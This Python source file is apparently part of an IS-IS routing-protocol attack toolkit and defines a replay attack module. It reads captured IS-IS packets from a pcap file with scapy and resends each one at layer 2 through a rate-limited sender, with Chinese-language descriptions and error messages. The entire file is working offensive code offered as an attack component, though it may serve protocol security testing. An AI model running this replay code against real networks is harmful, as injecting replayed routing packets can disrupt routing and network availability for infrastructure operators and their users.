from scapy.all import rdpcap
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import ReplayConfig
from isis_attack.network.sender import PacketSender


class ReplayAttack(BaseAttack):
    name = "replay"
    description = "重放攻击：从 pcap 读取 ISIS 报文重新发送"
    category = AttackCategory.PROTOCOL
    config: ReplayConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        if not self.config.capture_file:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details="重放攻击需要 capture_file 参数",
            )
        try:
            packets = rdpcap(self.config.capture_file)
        except Exception as e:
            return AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details=f"读取 pcap 失败: {e}",
            )
        for pkt in packets:
            self._sender.send_l2(pkt)
        return AttackResult(
            success=True, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"重放: {self._sender.sent_count} packets replayed",
        )

